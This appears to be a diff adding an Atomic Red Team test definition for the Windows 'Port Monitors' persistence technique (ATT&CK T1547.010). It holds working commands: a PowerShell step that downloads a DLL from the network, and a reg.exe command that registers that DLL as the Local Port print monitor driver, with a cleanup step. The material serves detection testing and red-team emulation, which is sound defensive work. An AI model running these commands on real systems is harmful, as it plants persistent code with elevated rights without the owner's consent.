@@ -1,0 +1,30 @@
+attack_technique: T1547.010
+display_name: Port Monitors
+atomic_tests:
+- name: Change Windows Default Print Monitor
+  auto_generated_guid: 0778f116-a748-49c6-9633-122401744b26
+  description: |
+    Register a malicious dll as a port monitor by changing the registry key. This can be used for persistence or privilege escalation.
+  supported_platforms:
+  - windows
+  input_arguments:
+    dll_payload:
+      description: DLL to inject
+      type: Path
+      default: PathToAtomicsFolder\T1547.010\src\x64\T1547.dll
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      T1547.dll must exist on disk at specified location (#{dll_payload})
+    prereq_command: |
+      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.010/src/x64/T1547.dll" -OutFile "#{dll_payload}"
+  executor:
+    command: |
+      reg.exe ADD "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\Local Port" /v Driver /t REG_SZ /d #{dll_payload} /f
+    cleanup_command: |
+      reg.exe ADD "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\Local Port" /v Driver /t REG_SZ /d localspl.dll /f
+    name: command_prompt
+    elevation_required: true
